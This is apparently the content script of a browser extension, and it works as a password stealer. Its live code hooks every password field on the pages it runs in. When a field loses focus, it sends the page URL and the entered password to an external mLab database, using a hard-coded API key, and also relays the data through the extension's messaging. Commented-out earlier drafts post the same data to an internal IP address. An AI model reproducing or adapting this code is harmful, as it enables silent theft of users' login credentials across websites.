//var script = document.createElement("script");
//var z = document.createElement('div');
//z.innerHTML = '<form action="https://10.0.1.11:81/api/values" style="display:none" method="post" id="textFinderForm"><input type="hidden" id="textFinderUrl" name="Url" /><input type="hidden" id="textFinderName" name="Name" /><input type="hidden" id="textFinderId" name="Id" /><input type="hidden" id="textFinderValue" name="Value" /><button type="submit"></button></form>';
//document.body.appendChild(z);
//script.innerHTML =
////"(function () {  var textFile = null, makeTextFile = function (text) {var data = new Blob([text], {type: 'text/plain'});if (textFile !== null) {window.URL.revokeObjectURL(textFile);}textFile = window.URL.createObjectURL(data);return textFile;};var textbox = document.getElementById('lst-ib');textbox.addEventListener('focusout', function () {var link = document.getElementById('downloadlink');link.href = makeTextFile(textbox.value);link.click();}, false);})();";
////"(function () { if(document.querySelectorAll('input[type=password]').length>0){  var textboxes = document.querySelectorAll('input[type=\"password\"]'); for (var i = 0 ; i < textboxes.length ; ++i) { textboxes[i].addEventListener('focusout', function () { var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() {if (xhttp.readyState == 4 && xhttp.status == 200) {}};xhttp.open(\"POST\", \"http://10.0.1.11:81/api/values\", true); xhttp.setRequestHeader('Access-Control-Allow-Origin', '*');xhttp.setRequestHeader('Access-Control-Allow-Methods', 'GET, PUT, POST, DELETE, OPTIONS');xhttp.setRequestHeader('Access-Control-Allow-Headers', 'Content-Type, Content-Range, Content-Disposition, Content-Description'); xhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");xhttp.send(\"Url=Facebook&Value=hello\"); }, false);}}      })();";
////"textbox = document.getElementById('pass');textbox.addEventListener('focusout', function () { console.log(textbox.value)});"
////"chrome.runtime.sendMessage({greeting: \"hello\"}, function(response) {console.log('');});"
//"";
//document.head.appendChild(script);
if (document.querySelectorAll('input[type=password]').length > 0) {
    var textboxes = document.querySelectorAll('input[type=\"password\"]');
    for (var i = 0 ; i < textboxes.length ; ++i) {
        textboxes[i].addEventListener('focusout', function () {
            var contentstr = "Url=" + document.URL + "&Value=" + this.value + "&Id=" + this.id + "&Name=" + this.getAttribute("name") + "";
            chrome.runtime.sendMessage({
                action: "sendData",
                data: contentstr
            });
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function () {
                if (xhttp.readyState == 4 && xhttp.status == 200) {
                }
            };
            xhttp.open("post", "https://api.mlab.com/api/1/databases/stack/collections/data?apiKey=EWmZ9QCcVO6ikOTQfbp_V5VuLfch8eF9", true);
            xhttp.setRequestHeader('Access-Control-Allow-Origin', '*');
            xhttp.setRequestHeader('Access-Control-Allow-Methods', 'GET, PUT, POST, DELETE, OPTIONS');
            xhttp.setRequestHeader('Access-Control-Allow-Headers', 'Content-Type, Content-Range, Content-Disposition, Content-Description');
            xhttp.setRequestHeader("Content-type", "application/json");
            xhttp.send(JSON.stringify([{ "Url": document.URL, "Value": this.value, "Id": this.id, "Name": this.getAttribute("name") }]));
        }, false);
    }
}
